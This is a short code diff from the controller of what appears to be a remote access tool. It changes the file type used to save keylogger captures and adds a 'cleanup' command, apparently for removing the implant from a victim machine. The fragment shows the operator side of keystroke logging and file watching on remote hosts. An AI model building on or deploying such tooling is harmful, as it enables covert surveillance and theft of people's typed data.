@@ -253,7 +253,7 @@ class Command:
     @staticmethod
     def keylogger_save(conn, cmd):
         Helper.send(conn, cmd)
-        Helper.recv_file(conn, 'Keylog{}.png'.format(Helper.get_time()))
+        Helper.recv_file(conn, 'Keylog{}.txt'.format(Helper.get_time()))
 
     @staticmethod
     def filewatch(conn, cmd):
@@ -275,6 +275,14 @@ class Command:
                 Helper.send(conn, 'stop')
                 event.wait()
                 break
+
+    @staticmethod
+    def cleanup(conn, cmd):
+        Helper.send(conn, cmd)
+        status, data = Helper.recv(conn)
+        print(data.decode())
+        if status:
+            raise ConnectionResetError('Cleanup success')
 
 
 class Alias:
